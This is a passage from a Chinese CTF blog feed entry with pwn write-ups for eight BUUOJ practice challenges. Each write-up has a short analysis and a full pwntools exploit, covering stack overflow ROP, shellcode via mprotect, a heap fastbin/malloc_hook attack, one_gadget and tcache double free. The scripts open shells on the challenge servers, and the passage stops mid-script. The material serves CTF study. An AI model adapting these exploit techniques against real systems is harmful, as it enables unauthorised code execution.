      <category term="漏洞分析" scheme="https://leave-Devour.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ刷题(2)</title>
    <link href="https://leave-devour.github.io/2020/05/04/BUUOJ%E5%88%B7%E9%A2%98-2/"/>
    <id>https://leave-devour.github.io/2020/05/04/BUUOJ%E5%88%B7%E9%A2%98-2/</id>
    <published>2020-05-04T12:29:10.000Z</published>
    <updated>2020-05-08T12:18:20.109Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h2 id="1、not-the-same-3dsctf-2016"><a href="#1、not-the-same-3dsctf-2016" class="headerlink" title="1、not_the_same_3dsctf_2016"></a>1、not_the_same_3dsctf_2016</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>跟 get_started_3dsctf_2016 一样。执行shellcode 就ok</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:26017"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./not_the_same_3dsctf_2016"</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x2d</span>+p32(elf.symbols[<span class="string">'mprotect'</span>])+p32(<span class="number">0x0806fcc8</span>)+p32(<span class="number">0x080EB000</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(<span class="number">0x0806fcc8</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload +=p32(<span class="number">0x080EB000</span>)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x080EB000</span>)</span><br><span class="line">raw_input()</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="2、babyheap-0ctf-2017"><a href="#2、babyheap-0ctf-2017" class="headerlink" title="2、babyheap_0ctf_2017"></a>2、babyheap_0ctf_2017</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200505021154262.png" alt="image-20200505021154262"></p><p>size 是由可以控制的，然后对size没有检查</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:28739"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">": "</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">": "</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">": "</span>,idx)</span><br><span class="line">    sla(<span class="string">": "</span>,size)</span><br><span class="line">    sa(<span class="string">': '</span>,content.ljust(size,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">": "</span>,idx)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0xa1</span>))</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">"\n"</span>)</span><br><span class="line">libc = uu64(r(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(hex(libc))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#6</span></span><br><span class="line">rce = libc + <span class="number">0x4526a</span></span><br><span class="line">malloc_hook = libc+<span class="number">0x3c4b10</span></span><br><span class="line">free_hook = libc + <span class="number">0x3c67a8</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(rce))</span><br><span class="line">sla(<span class="string">": "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">": "</span>,<span class="number">0x20</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="3、-HarekazeCTF2019-baby-rop"><a href="#3、-HarekazeCTF2019-baby-rop" class="headerlink" title="3、[HarekazeCTF2019]baby_rop"></a>3、[HarekazeCTF2019]baby_rop</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200505211442107.png" alt="image-20200505211442107"></p><p>一个scanf溢出，system 有了 、/bin/sh也有了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:29143"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./babyrop'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./babyrop"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400683</span>)+p64(<span class="number">0x0601048</span>)+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">sla(<span class="string">"? "</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="4、level0"><a href="#4、level0" class="headerlink" title="4、level0"></a>4、level0</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200505212221410.png" alt="image-20200505212221410"></p><p>啥都有了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:25636"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./level0'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400596</span>)</span><br><span class="line">sla(<span class="string">"\n"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="5、one-gadget"><a href="#5、one-gadget" class="headerlink" title="5、one_gadget"></a>5、one_gadget</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200505213915299.png" alt="image-20200505213915299"></p><p><img src="/images/image-20200505213924341.png" alt="image-20200505213924341"></p><p>泄露printf的libc地址，然后输入一个数字，然后执行。那直接one_gadget吧</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29089</span>)</span><br><span class="line"><span class="comment">#p = process("./one_gadget")</span></span><br><span class="line">elf= ELF(<span class="string">"./libc-2.29.so"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"u:0x"</span>)</span><br><span class="line">libc = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - elf.symbols[<span class="string">'printf'</span>]</span><br><span class="line">log.info(hex(libc))</span><br><span class="line">p.recvuntil(<span class="string">"Give me your one gadget:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x106ef8</span>+libc))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="6、level2"><a href="#6、level2" class="headerlink" title="6、level2"></a>6、level2</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>跟前面的那个level一样，只是32位的程序</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27252</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(elf.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x804A024</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="7、ciscn-s-3"><a href="#7、ciscn-s-3" class="headerlink" title="7、ciscn_s_3"></a>7、ciscn_s_3</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200505230602430.png" alt="image-20200505230602430"></p><p>溢出，然后泄露libc，然后调用one_gadget</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">s       = lambda x                  :orda.send(str(x))</span><br><span class="line">sa      = lambda x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = lambda x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = lambda x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = lambda numb=4096          :orda.recv(numb)</span><br><span class="line">rc        = lambda                     :orda.recvall()</span><br><span class="line">ru      = lambda x, drop=True          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = lambda x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = lambda                    :orda.interactive()</span><br><span class="line">uu32    = lambda x   :u32(x.ljust(4, &apos;\x00&apos;))</span><br><span class="line">uu64    = lambda x   :u64(x.ljust(8, &apos;\x00&apos;))    </span><br><span class="line">def getbase_b64(t):</span><br><span class="line">    pid=proc.pidof(s)[0]</span><br><span class="line">    pie_pwd =&apos;/proc/&apos;+str(pid)+&apos;/maps&apos;</span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    return f_pie.read()[:12]</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    s = &quot;node3.buuoj.cn:29718&quot;</span><br><span class="line">    host = s.split(&quot;:&quot;)[0]</span><br><span class="line">    port = int(s.split(&quot;:&quot;)[1])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line">else:</span><br><span class="line">    orda = process(&apos;./ciscn_s_3&apos;)</span><br><span class="line">elf = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span><br><span class="line">payload = &apos;a&apos;*0x10+p64(0x04004F1)+p64(0x04004F1)</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">r(0x30)</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">r(0x30)</span><br><span class="line">#raw_input()</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">r(0x28)</span><br><span class="line">raw_input()</span><br><span class="line">libc = uu64(r(0x8)) -0x21b97</span><br><span class="line">payload = &apos;a&apos;*0x10+p64(0x4f322+libc)*2+p64(0)*20</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">log.info(hex(libc))</span><br><span class="line">r(0x30)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="8、ciscn-2019-sw-5"><a href="#8、ciscn-2019-sw-5" class="headerlink" title="8、ciscn_2019_sw_5"></a>8、ciscn_2019_sw_5</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200508200313190.png" alt="image-20200508200313190"></p><p><img src="/images/image-20200508200321070.png" alt="image-20200508200321070"></p><p><img src="/images/image-20200508200329448.png" alt="image-20200508200329448"></p><p><img src="/images/image-20200508200337292.png" alt="image-20200508200337292"></p><p>很有意思的一道题，可以无限add，但是只能free 3次，哪有这样不公平的啊</p><p>而且这个libc是2.27的，然后free没置零，可以double free</p><p>然后 就是 大于0x400大小的chunk，再free不放入tcache中，然后就得到libc了，对了这题的doublefree 可以迁移下来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="number">26327</span></span><br><span class="line"></span><br><span class="line">r = remote(host,port)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#r = process('./ciscn_2019_sw_5')</span></span><br><span class="line"><span class="comment">#r.recvuntil("&gt;&gt; ")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    r.sendline(str(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">    r.send(title)</span><br><span class="line">    r.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt; 